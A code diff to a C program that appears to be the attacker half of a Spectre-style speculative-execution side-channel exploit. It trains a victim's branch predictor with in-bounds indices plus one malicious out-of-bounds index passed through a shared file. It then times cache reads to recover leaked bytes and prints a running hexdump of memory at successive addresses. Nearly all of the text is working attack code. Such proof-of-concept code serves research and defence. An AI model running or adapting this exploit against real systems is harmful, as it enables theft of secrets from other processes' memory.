@@ -30,25 +30,30 @@ int fd_lock, shared_fd;
 
 int results[256];
 
-void read_index(size_t index, int tries) {
-	static int i, reading, j, k, mix_i, rounds = 4, round_length = 8;
+void read_index(size_t index, int tries, int train_rounds, int round_length) {
+	static FILE *f;
+	static int i, j, k, mix_i, locked;
 	static unsigned junk = 0;
-	static size_t training_x, x;
-	register uint64_t time1, time2;
-	static volatile uint8_t *addr;
+	static size_t training_x;
 
 	// acquire lock
-	int locked = -1;
+	locked = -1;
 	while (locked != 0) {
 		fd_lock = open(lock_file_name, O_CREAT);
 		locked = flock(fd_lock, LOCK_EX);
 	}
 
-	FILE *f = fopen(index_file_name, "w");
+	/* 
+		 output position to be read
+		 There are round_length - 1 training inputs 
+		 and 1 malicious input, repeated train_round times
+	*/
+	f = fopen(index_file_name, "w");
 	training_x = tries % array1_size;
-	fprintf(f, "%d ", rounds * round_length);
-	for (int i = 0; i < rounds; ++i) {
-		for (int j = 0; j < round_length - 1; ++j) {
+
+	fprintf(f, "%d ", train_rounds * round_length);
+	for (i = 0; i < train_rounds; ++i) {
+		for (j = 0; j < round_length - 1; ++j) {
 			fprintf(f, "%zu ", training_x);
 		}
 		fprintf(f, "%zu ", index);
@@ -63,9 +68,13 @@ void read_index(size_t index, int tries) {
 	flock(fd_lock, LOCK_UN);
 	close(fd_lock);
 
+	// when it dissapears, the victim processed everything
+	// and the sidechannel can be read
 	while (access(index_file_name, F_OK) != -1);
 
 	/* Time reads. Order is lightly mixed up to prevent stride prediction */
+	register uint64_t time1, time2;
+	static volatile uint8_t *addr;
 	for (i = 0; i < 256; i++) {
 		mix_i = ((i * 167) + 13) & 255;
 		addr = &array2[mix_i * 512];
@@ -88,7 +97,7 @@ int main() {
 	}
 
 	int i, best_char, printed = 0;
-	const int no_readings = 500,
+	const int no_readings = 5,
 						train_rounds = 4,
 						round_length = 8;
 
@@ -98,15 +107,17 @@ int main() {
 
 	printf("%016lX | ", offset);
 	for (int tries = 0; ; ++tries) {
-		// flush results
+		// reset results
 		for (i = 0; i < 256; ++i) {
 			results[i] = 0;
 		}
 
+		// performa the attack
 		for (i = 1; i < no_readings; ++i) {
-			read_index(offset, tries);
+			read_index(offset, tries, train_rounds, round_length);
 		}
 
+		// select best scoring caracter 
 		best_char = -1;
 		for (i = 0; i < 256; i++) {
 			if (best_char < 0 || results[i] >= results[best_char]) {
@@ -114,15 +125,16 @@ int main() {
 			}
 		}
 
-		/* printf("%c", (best_char > 31 && best_char < 127 ? best_char : '.')); */
-		printf("%c", best_char);
+		// human readable hexdump
 		printed += 1;
+		printf("%c", (best_char > 31 && best_char < 127 ? best_char : '.'));
 		if (printed % 0x50 == 0) {
 			printf("\n");
 			fflush(stdout);
 			printf("%016lX | ", offset);
 		}
 
+		// next memory address
 		++offset;
 	}
 }
